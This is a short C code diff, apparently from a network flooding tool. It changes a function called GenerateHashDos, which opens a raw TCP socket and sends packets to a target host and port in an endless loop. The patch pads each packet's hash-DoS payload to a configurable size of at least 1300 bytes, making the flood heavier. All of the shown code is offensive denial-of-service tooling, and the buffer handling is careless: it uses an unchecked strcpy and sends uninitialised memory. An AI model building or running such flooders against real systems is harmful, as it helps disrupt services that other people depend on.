@@ -6,6 +6,7 @@
 #include "base/make_tcp.h"
 
 extern int g_num_threads;
+extern int g_packet_size;
 
 // session counting
 __u64 g_hash_dos_num_total;
@@ -36,6 +37,16 @@ void *GenerateHashDos(void *data)
 {
   int thread_id = *((int *)data);
   int sock = MakeRawSocket(IPPROTO_TCP);
+  
+  int hash_data_size = -1;
+  if(g_packet_size> 1300)
+  	hash_data_size = g_packet_size;
+  else
+  	hash_data_size = 1300;
+  
+  char hash_data[hash_data_size];	
+  strcpy(hash_data,g_hash_dos_method);
+  
   while (1) {
     // *** begin of critical section ***
     pthread_mutex_lock(&g_hash_dos_mutex);
@@ -69,8 +80,8 @@ void *GenerateHashDos(void *data)
         inet_addr(g_hash_dos_now.dest),
         src_port,
         g_hash_dos_now.port,
-        g_hash_dos_method,
-        strlen(g_hash_dos_method),
+        hash_data,
+        hash_data_size,
         seq,
         ack,
         0);
